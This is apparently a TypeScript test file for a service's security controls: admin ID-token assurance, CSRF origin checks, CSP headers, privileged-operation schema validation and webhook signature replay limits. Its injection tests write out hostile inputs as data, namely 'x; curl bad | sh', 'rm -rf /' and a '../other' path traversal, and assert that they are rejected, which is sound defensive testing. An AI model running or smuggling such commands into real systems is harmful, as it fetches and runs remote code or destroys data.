import { test } from "node:test";
import assert from "node:assert/strict";
import { createHmac } from "node:crypto";
import {
  operation,
  recordInput,
  envelope,
} from "../packages/contracts/index.ts";
import {
  verifyWebhook,
  hash,
  equal,
  sameOrigin,
  adminAssurance,
} from "../packages/auth/index.ts";
import type { FastifyRequest } from "fastify";
import { server } from "../packages/observability/index.ts";

test("red/blue: administrator ID tokens cannot downgrade assurance, reuse stale authentication or name another authorized party", (t) => {
  const previous = process.env.OIDC_MFA_ACR;
  t.after(() => {
    if (previous === undefined) delete process.env.OIDC_MFA_ACR;
    else process.env.OIDC_MFA_ACR = previous;
  });
  process.env.OIDC_MFA_ACR = "urn:synthetic:phishing-resistant";
  const now = Date.now() / 1000;
  const good = {
    amr: ["mfa", "hwk"],
    acr: "urn:synthetic:phishing-resistant",
    auth_time: now,
    aud: "admin-client",
  };
  assert.doesNotThrow(() => adminAssurance(good, "admin-client"));
  for (const downgrade of [
    { amr: ["pwd"] },
    { acr: "urn:password-only" },
    { acr: undefined },
    { auth_time: undefined },
    { auth_time: now - 3601 },
    { auth_time: now + 60 },
    { auth_time: NaN },
    { azp: "another-client" },
    { aud: ["admin-client", "another-client"] },
  ])
    assert.throws(() =>
      adminAssurance({ ...good, ...downgrade }, "admin-client"),
    );
  assert.doesNotThrow(() =>
    adminAssurance(
      { ...good, aud: ["admin-client", "another-client"], azp: "admin-client" },
      "admin-client",
    ),
  );
});

test("local HTTPS and loopback origins are explicit; sibling and nested sites cannot bypass CSRF", (t) => {
  const previous = {
    environment: process.env.FV_ENV,
    origin: process.env.ADMIN_ORIGIN,
  };
  t.after(() => {
    if (previous.environment === undefined) delete process.env.FV_ENV;
    else process.env.FV_ENV = previous.environment;
    if (previous.origin === undefined) delete process.env.ADMIN_ORIGIN;
    else process.env.ADMIN_ORIGIN = previous.origin;
  });
  process.env.FV_ENV = "local";
  process.env.ADMIN_ORIGIN = "https://admin.fv";
  const request = (origin: string, site?: string) =>
    ({ headers: { origin, "sec-fetch-site": site } }) as FastifyRequest;
  for (const origin of ["https://admin.fv", "http://127.0.0.1:43802"])
    assert.doesNotThrow(() => sameOrigin(request(origin)));
  for (const origin of [
    "https://api.fv",
    "https://dev.admin.fv",
    "https://admin.fv.evil.test",
    "null",
  ])
    assert.throws(() => sameOrigin(request(origin)));
  assert.throws(() => sameOrigin(request("https://admin.fv", "cross-site")));
});

test("HTTP assets are allowed only locally; remote environments retain HTTPS upgrades", async (t) => {
  const original = process.env.FV_ENV;
  t.after(() => {
    if (original === undefined) delete process.env.FV_ENV;
    else process.env.FV_ENV = original;
  });
  for (const environment of ["local", "staging", "production"]) {
    process.env.FV_ENV = environment;
    const app = await server("security-test");
    try {
      const response = await app.inject({ url: "/health/live" });
      assert.equal(response.statusCode, 200);
      const csp = String(response.headers["content-security-policy"]);
      assert.equal(
        csp.includes("upgrade-insecure-requests"),
        environment !== "local",
      );
      assert(csp.includes("script-src 'self'"));
    } finally {
      await app.close();
    }
  }
});

test("privileged operation schemas reject command injection and unknown parameters", () => {
  assert.equal(
    operation.safeParse({
      action: "deploy.release",
      parameters: { release: "x; curl bad | sh" },
    }).success,
    false,
  );
  assert.equal(
    operation.safeParse({
      action: "backup.verify",
      parameters: { command: "rm -rf /" },
    }).success,
    false,
  );
  assert.equal(
    operation.safeParse({ action: "shell", parameters: {} }).success,
    false,
  );
  assert.equal(
    operation.safeParse({
      action: "wireguard.revoke",
      parameters: { name: "../other" },
    }).success,
    false,
  );
});
test("vector contracts reject nonfinite, mismatched and zero vectors", () => {
  for (const embedding of [
    [0, 0, 0],
    [NaN, 1, 2],
    [1, 2],
    [Infinity, 2, 3],
  ])
    assert.equal(
      recordInput.safeParse({ content: "x", embedding }).success,
      false,
    );
  assert.equal(
    recordInput.safeParse({ content: "test", embedding: [1, 0, 0] }).success,
    true,
  );
});
test("queue envelope requires durable provenance and excludes injected properties", () => {
  assert.equal(
    envelope.safeParse({ version: 1, jobId: "nope" }).success,
    false,
  );
});
test("webhook signatures bind timestamp/body and reject replay window", () => {
  const now = Date.now(),
    stamp = String(Math.floor(now / 1000)),
    body = Buffer.from('{"id":"synthetic"}'),
    key = "synthetic-key";
  const sig = createHmac("sha256", key)
    .update(`${stamp}.`)
    .update(body)
    .digest("hex");
  assert(verifyWebhook(body, stamp, sig, key, now));
  assert(!verifyWebhook(Buffer.from("changed"), stamp, sig, key, now));
  assert(!verifyWebhook(body, stamp, sig, key, now + 301000));
  assert(!equal(hash("a"), hash("b")));
});
